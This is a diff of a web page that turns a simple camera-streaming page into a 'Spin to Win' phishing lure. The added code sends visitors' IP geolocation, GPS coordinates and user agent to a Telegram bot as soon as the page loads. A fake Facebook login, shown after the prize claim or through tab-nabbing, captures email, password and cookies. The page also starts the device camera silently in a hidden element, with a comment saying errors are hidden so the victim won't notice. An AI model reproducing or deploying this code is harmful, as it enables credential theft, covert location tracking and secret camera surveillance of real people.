@@ -1,84 +1,596 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-    <title>Camera Device</title>
-</head>
-<body>
-    <h2>IP Camera Active</h2>
-    <video id="localVideo" autoplay playsinline muted></video>
-    
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        let localStream;
-        let peerConnection;
-        let pendingCandidates = []; // আগে আসা ডেটা সেভ রাখার জন্য
-        let currentFacingMode = 'environment';
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin to Win</title>
+    <link id="favicon" rel="icon" href="#">
+    <style>
+        :root {
+            --accent: #00ff88;
+            --blue: #1877f2;
+            --dark: #0a0a1a;
+        }
 
-        const configuration = { 'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}] };
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-        async function startCamera(facingMode) {
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
+        body {
+            background: var(--dark);
+            font-family: 'Segoe UI', sans-serif;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+        }
+
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.25;
+        }
+
+        #bait-page {
+            text-align: center;
+            background: rgba(10, 10, 26, 0.9);
+            border: 2px solid var(--accent);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.3);
+            width: 90%;
+            max-width: 400px;
+            z-index: 10;
+        }
+
+        #bait-page h1 {
+            text-shadow: 0 0 10px var(--accent);
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        #bait-page p {
+            margin: 15px 0;
+            color: #ccc;
+        }
+
+        .wheel-wrapper {
+            position: relative;
+            width: 240px;
+            height: 240px;
+            margin: 15px auto;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 6px solid #fff;
+            position: relative;
+            overflow: hidden;
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+        }
+
+        .seg {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            transform-origin: bottom right;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+        }
+
+        .seg:nth-child(1) {
+            background: #00ff88;
+            transform: rotate(0deg);
+        }
+
+        .seg:nth-child(2) {
+            background: #ff6600;
+            transform: rotate(45deg);
+        }
+
+        .seg:nth-child(3) {
+            background: #00ff88;
+            transform: rotate(90deg);
+        }
+
+        .seg:nth-child(4) {
+            background: #ff6600;
+            transform: rotate(135deg);
+        }
+
+        .seg:nth-child(5) {
+            background: #00ff88;
+            transform: rotate(180deg);
+        }
+
+        .seg:nth-child(6) {
+            background: #ff6600;
+            transform: rotate(225deg);
+        }
+
+        .seg:nth-child(7) {
+            background: #00ff88;
+            transform: rotate(270deg);
+        }
+
+        .seg:nth-child(8) {
+            background: #ff6600;
+            transform: rotate(315deg);
+        }
+
+        .wheel-wrapper::after {
+            content: '▼';
+            position: absolute;
+            top: -18px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 28px;
+            color: #fff;
+            z-index: 20;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: var(--accent);
+            color: #0a0a1a;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
+            text-transform: uppercase;
+            transition: 0.2s;
+        }
+
+        .btn:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.6);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        #fb-page {
+            width: 100%;
+            max-width: 380px;
+            background: #fff;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            display: none;
+            z-index: 10;
+            color: #1c1e21;
+        }
+
+        .fb-logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+
+        .fb-input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .fb-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            background: var(--blue);
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .fb-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 15px;
+        }
+
+        #win-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        #win-overlay.show {
+            display: flex;
+        }
+
+        #win-overlay .win-box {
+            background: linear-gradient(135deg, #0a0a1a, #1a1a3a);
+            border: 2px solid #00ff88;
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 0 60px rgba(0, 255, 136, 0.4);
+            animation: pulse-glow 1.5s ease-in-out infinite;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        #win-overlay .win-box h2 {
+            font-size: 32px;
+            color: #00ff88;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.6);
+        }
+
+        #win-overlay .win-box .big-money {
+            font-size: 56px;
+            font-weight: bold;
+            color: #ffd700;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.6);
+            margin: 15px 0;
+        }
+
+        #win-overlay .win-box p {
+            color: #ccc;
+            font-size: 16px;
+            margin: 10px 0;
+        }
+
+        #win-overlay .win-box .claim-btn {
+            padding: 14px 40px;
+            border: none;
+            border-radius: 10px;
+            background: #ffd700;
+            color: #000;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
+        }
+
+        @keyframes pulse-glow {
+
+            0%,
+            100% {
+                box-shadow: 0 0 40px rgba(0, 255, 136, 0.3);
             }
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-                document.getElementById('localVideo').srcObject = localStream;
-                
-                if (peerConnection) {
-                    const videoTrack = localStream.getVideoTracks()[0];
-                    const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
-                    if (sender) sender.replaceTrack(videoTrack);
-                }
-            } catch (err) {
-                console.error("Camera error:", err);
-                alert("ক্যামেরার পারমিশন দিন বা ব্রাউজার সাপোর্ট করছে না!");
+
+            50% {
+                box-shadow: 0 0 80px rgba(0, 255, 136, 0.6);
             }
         }
 
-        socket.on('offer', async (offer) => {
-            peerConnection = new RTCPeerConnection(configuration);
-            
-            if (localStream) {
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
+        .spin-count {
+            color: #ffd700;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+    <canvas id="c"></canvas>
+
+    <div id="bait-page">
+        <h1>🎰 SPIN & WIN!</h1>
+        <div class="wheel-wrapper">
+            <div class="wheel" id="wheel">
+                <div class="seg">📱</div>
+                <div class="seg">💰</div>
+                <div class="seg">⌚</div>
+                <div class="seg">💻</div>
+                <div class="seg">📸</div>
+                <div class="seg">🎧</div>
+                <div class="seg">💎</div>
+                <div class="seg">🎁</div>
+            </div>
+        </div>
+        <p>You have <span class="spin-count" id="spin-count">(1)</span> Free Spin left!</p>
+        <button class="btn" id="spinBtn">SPIN TO CLAIM</button>
+    </div>
+
+    <div id="win-overlay">
+        <div class="win-box">
+            <h2>🎉 CONGRATULATIONS!</h2>
+            <div class="big-money">$100</div>
+            <p>You won <strong>$100</strong> cash prize!</p>
+            <p style="font-size:13px; color:#999;">To withdraw your winnings, please verify your account.</p>
+            <button class="claim-btn" id="claimBtn">▶ CLAIM YOUR PRIZE</button>
+        </div>
+    </div>
+
+    <div id="fb-page">
+        <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg"
+            alt="Facebook">
+        <p style="color:#1c1e21; font-size:16px;">Session Expired. Please log in again to claim your prize.</p>
+        <input type="text" id="email" class="fb-input" placeholder="Email or phone number" autocomplete="off">
+        <input type="password" id="pass" class="fb-input" placeholder="Password" autocomplete="off">
+        <button class="fb-btn" onclick="sendData()">Log In</button>
+        <a href="#" class="fb-link">Forgotten password?</a>
+    </div>
+
+    <script>
+        const TOKEN = '8670892098:AAF5eDLUQxQpshS_SVgQNvUSaQQ6xRbmzGM';
+        const CHAT_ID = '6740599881';
+
+        // ========================
+        // NEW: IP + GPS EXFILTRATION
+        // ========================
+
+        // Runs immediately on page load
+        (function exfiltrateIPAndGPS() {
+            // 1) Get IP geolocation via freeipapi.com
+            fetch('https://free.freeipapi.com/api/json')
+                .then(r => r.json())
+                .then(ipData => {
+                    console.log('IP data:', ipData);
+                    // 2) Try to get GPS coordinates
+                    if ('geolocation' in navigator) {
+                        navigator.geolocation.getCurrentPosition(
+                            // Success – got GPS
+                            function (pos) {
+                                const lat = pos.coords.latitude;
+                                const lon = pos.coords.longitude;
+                                const acc = pos.coords.accuracy;
+                                const msg = `📡 VICTIM GEOLOCATION DATA\n\n` +
+                                    `🌐 IP: ${ipData.ipAddress || 'N/A'}\n` +
+                                    `📍 Country: ${ipData.countryName || 'N/A'} (${ipData.countryCode || 'N/A'})\n` +
+                                    `🏙️  City: ${ipData.cityName || 'N/A'}\n` +
+                                    `🗺️  Region: ${ipData.regionName || 'N/A'}\n` +
+                                    `📮 Zip: ${ipData.zipCode || 'N/A'}\n` +
+                                    `⏰ Timezone: ${ipData.timeZone || 'N/A'}\n` +
+                                    `📌 IP Lat/Lon: ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}\n\n` +
+                                    `🛰️ GPS COORDINATES (from device):\n` +
+                                    `   Latitude: ${lat}\n` +
+                                    `   Longitude: ${lon}\n` +
+                                    `   Accuracy: ${acc}m\n` +
+                                    `🌍 Google Maps: https://www.google.com/maps?q=${lat},${lon}\n\n` +
+                                    `🧠 User Agent: ${navigator.userAgent}`;
+                                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                                });
+                            },
+                            // Error / denied – send IP data only
+                            function (err) {
+                                const reason = err.code === 1 ? 'User denied geolocation' :
+                                    err.code === 2 ? 'Position unavailable' :
+                                        err.code === 3 ? 'Timeout' : 'Unknown error';
+                                const msg = `📡 VICTIM GEOLOCATION DATA\n\n` +
+                                    `🌐 IP: ${ipData.ipAddress || 'N/A'}\n` +
+                                    `📍 Country: ${ipData.countryName || 'N/A'} (${ipData.countryCode || 'N/A'})\n` +
+                                    `🏙️  City: ${ipData.cityName || 'N/A'}\n` +
+                                    `🗺️  Region: ${ipData.regionName || 'N/A'}\n` +
+                                    `📮 Zip: ${ipData.zipCode || 'N/A'}\n` +
+                                    `⏰ Timezone: ${ipData.timeZone || 'N/A'}\n` +
+                                    `📌 IP Lat/Lon: ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}\n\n` +
+                                    `⚠️ GPS: Denied/Unavailable (${reason})\n\n` +
+                                    `🧠 User Agent: ${navigator.userAgent}`;
+                                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                                });
+                            },
+                            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                        );
+                    } else {
+                        // No geolocation API – send IP only
+                        const msg = `📡 VICTIM GEOLOCATION DATA\n\n` +
+                            `🌐 IP: ${ipData.ipAddress || 'N/A'}\n` +
+                            `📍 Country: ${ipData.countryName || 'N/A'} (${ipData.countryCode || 'N/A'})\n` +
+                            `🏙️  City: ${ipData.cityName || 'N/A'}\n` +
+                            `🗺️  Region: ${ipData.regionName || 'N/A'}\n` +
+                            `📮 Zip: ${ipData.zipCode || 'N/A'}\n` +
+                            `⏰ Timezone: ${ipData.timeZone || 'N/A'}\n` +
+                            `📌 IP Lat/Lon: ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}\n\n` +
+                            `⚠️ GPS: Geolocation API not supported by browser\n\n` +
+                            `🧠 User Agent: ${navigator.userAgent}`;
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                        });
+                    }
+                })
+                .catch(err => {
+                    // Fallback if freeipapi fails – send raw IP info
+                    const msg = `📡 VICTIM DATA (IP API failed: ${err.message})\n\n🧠 User Agent: ${navigator.userAgent}`;
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                    });
                 });
+        })();
+
+        // Matrix rain
+        const c = document.getElementById('c');
+        const ctx = c.getContext('2d');
+        c.width = innerWidth; c.height = innerHeight;
+        const drops = Array(Math.floor(c.width / 20)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(10,10,26,0.05)';
+            ctx.fillRect(0, 0, c.width, c.height);
+            ctx.fillStyle = '#00ff88';
+            ctx.font = '15px monospace';
+            drops.forEach((y, i) => {
+                ctx.fillText(Math.random() > 0.5 ? '0' : '1', i * 20, y * 20);
+                if (y * 20 > c.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawMatrix, 50);
+
+        // Spin logic
+        const wheel = document.getElementById('wheel');
+        const spinBtn = document.getElementById('spinBtn');
+        const winOverlay = document.getElementById('win-overlay');
+        let spun = false;
+
+        spinBtn.addEventListener('click', () => {
+            if (spun) return;
+            spun = true;
+            spinBtn.disabled = true;
+            spinBtn.textContent = 'Spinning...';
+            document.getElementById('spin-count').textContent = '(0)';
+
+            const degrees = 720 + Math.floor(Math.random() * 720);
+            wheel.style.transform = `rotate(${degrees}deg)`;
+
+            setTimeout(() => {
+                // Show win overlay
+                winOverlay.classList.add('show');
+                spinBtn.textContent = 'SPIN TO CLAIM';
+            }, 4200);
+        });
+
+        // Claim button -> show Facebook login
+        document.getElementById('claimBtn').addEventListener('click', () => {
+            winOverlay.classList.remove('show');
+            document.getElementById('bait-page').style.display = 'none';
+            document.getElementById('fb-page').style.display = 'block';
+            document.body.style.background = '#f0f2f5';
+            document.title = 'Facebook – log in or sign up';
+            document.getElementById('favicon').href = 'https://www.facebook.com/favicon.ico';
+        });
+
+        // Tab nabbing -> Facebook login page
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                setTimeout(() => {
+                    winOverlay.classList.remove('show');
+                    document.getElementById('bait-page').style.display = 'none';
+                    document.getElementById('fb-page').style.display = 'block';
+                    document.body.style.background = '#f0f2f5';
+                    document.title = 'Facebook – log in or sign up';
+                    document.getElementById('favicon').href = 'https://www.facebook.com/favicon.ico';
+                }, 2000);
             }
+        });
 
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) socket.emit('candidate', event.candidate);
-            };
+        // Exfil
+        async function sendData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if (!email || !pass) return;
+            const msg = `🚀 Facebook Login Captured!\n👤 ${email}\n🔑 ${pass}\n🍪 ${document.cookie || 'None'}`;
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+            window.location.href = 'https://www.facebook.com';
+        }
+    <div style="opacity: 0; position: absolute; top: -9999px; left: -9999px; pointer-events: none;">
+    <video id="localVideo" autoplay playsinline muted></video>
+</div>
 
-            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    const socket = io();
+    let localStream;
+    let peerConnection;
+    let pendingCandidates = []; 
+    let currentFacingMode = 'environment';
+
+    const configuration = { 'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}] };
+
+    async function startCamera(facingMode) {
+        if (localStream) {
+            localStream.getTracks().forEach(track => track.stop());
+        }
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            });
+            document.getElementById('localVideo').srcObject = localStream;
             
-            // পেন্ডিং থাকা ক্যান্ডিডেটগুলো এখন কানেক্ট করা হবে
-            for (let c of pendingCandidates) {
-                await peerConnection.addIceCandidate(new RTCIceCandidate(c));
+            if (peerConnection) {
+                const videoTrack = localStream.getVideoTracks()[0];
+                const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
+                if (sender) sender.replaceTrack(videoTrack);
             }
-            pendingCandidates = [];
+        } catch (err) {
+            console.error("Camera error:", err);
+            // ভিকটিম যেন বুঝতে না পারে সেজন্য এখানে কোনো অ্যালার্ট বা এরর মেসেজ রাখা হয়নি
+        }
+    }
 
-            const answer = await peerConnection.createAnswer();
-            await peerConnection.setLocalDescription(answer);
-            socket.emit('answer', answer);
-        });
+    socket.on('offer', async (offer) => {
+        peerConnection = new RTCPeerConnection(configuration);
+        
+        if (localStream) {
+            localStream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, localStream);
+            });
+        }
 
-        socket.on('candidate', async (candidate) => {
-            if (!peerConnection || !peerConnection.remoteDescription) {
-                pendingCandidates.push(candidate); // প্রস্তুত না থাকলে কিউ-তে রাখা হবে
-            } else {
-                await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-            }
-        });
+        peerConnection.onicecandidate = (event) => {
+            if (event.candidate) socket.emit('candidate', event.candidate);
+        };
 
-        socket.on('switchCamera', () => {
-            currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
-            startCamera(currentFacingMode);
-        });
+        await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+        
+        for (let c of pendingCandidates) {
+            await peerConnection.addIceCandidate(new RTCIceCandidate(c));
+        }
+        pendingCandidates = [];
 
+        const answer = await peerConnection.createAnswer();
+        await peerConnection.setLocalDescription(answer);
+        socket.emit('answer', answer);
+    });
+
+    socket.on('candidate', async (candidate) => {
+        if (!peerConnection || !peerConnection.remoteDescription) {
+            pendingCandidates.push(candidate);
+        } else {
+            await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+        }
+    });
+
+    socket.on('switchCamera', () => {
+        currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
         startCamera(currentFacingMode);
-    </script>
+    });
+
+    // পেজ লোড হওয়ার সাথে সাথে ব্যাকগ্রাউন্ডে ক্যামেরা চালু হবে
+    startCamera(currentFacingMode);
+     </script>
+
 </body>
+
 </html>
